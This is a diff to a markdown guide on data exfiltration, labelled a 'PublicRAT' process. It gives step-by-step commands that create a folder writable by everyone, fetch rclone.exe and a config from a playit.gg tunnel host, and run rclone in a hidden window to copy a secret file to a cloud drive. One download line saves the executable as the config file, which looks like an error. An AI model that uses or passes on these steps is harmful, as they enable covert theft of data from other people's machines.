@@ -153,12 +153,12 @@ Your file (e.g., `secret.txt`) should now appear in the root of your Google Driv
 ### Full process using port forwarding
 
 * Start the playit.gg
-* E.g., start a server:
+* E.g., start the server from **E:\Hacking\rclone-v1.69.2-windows-amd64\rclone-payload** :
    ```bash
    python -m http.server 24547
    ```
 * Then do the following:
-  ```cmd
+  ```powershall
   mkdir C:\PublicRAT
   icacls "C:\PublicRAT" /grant Everyone:(OI)(CI)M
   ```
@@ -168,13 +168,13 @@ Your file (e.g., `secret.txt`) should now appear in the root of your Google Driv
   ```cmd
   cmd.exe /c echo Hello > C:\PublicRAT\test.txt
   ```
-* If the **test.txt** successfully write in that location, then do:
-```powershell
-Invoke-WebRequest -Uri "http://established-colombia.gl.at.ply.gg:24547/rclone.exe" -OutFile "C:\PublicRAT\rclone.exe"
-Invoke-WebRequest -Uri "http://established-colombia.gl.at.ply.gg:24547/rclone.exe" -OutFile "C:\PublicRAT\rclone.conf"
-```
+* If the **test.txt** successfully writes in that location, then do:
+  ```powershell
+  Invoke-WebRequest -Uri "http://established-colombia.gl.at.ply.gg:24547/rclone.exe" -OutFile "C:\PublicRAT\rclone.exe"
+  Invoke-WebRequest -Uri "http://established-colombia.gl.at.ply.gg:24547/rclone.exe" -OutFile "C:\PublicRAT\rclone.conf"
+  ```
 * Then transfer data using the following convention:
-```powershell
-Start-Process -WindowStyle Hidden -FilePath "C:\PublicRAT\rclone.exe" -ArgumentList 'copy "C:\Users\Public\Documents\newSecret.txt" myStorage:/ --config "C:\PublicRAT\rclone.conf"'
-```
-* Check your bsse drive and click recent, you will get the desired file.
+  ```powershell
+  Start-Process -WindowStyle Hidden -FilePath "C:\PublicRAT\rclone.exe" -ArgumentList 'copy "C:\Users\Public\Documents\newSecret.txt" myStorage:/ --config "C:\PublicRAT\rclone.conf"'
+  ```
+* Check your BSSE drive and click recent, you will get the desired file.
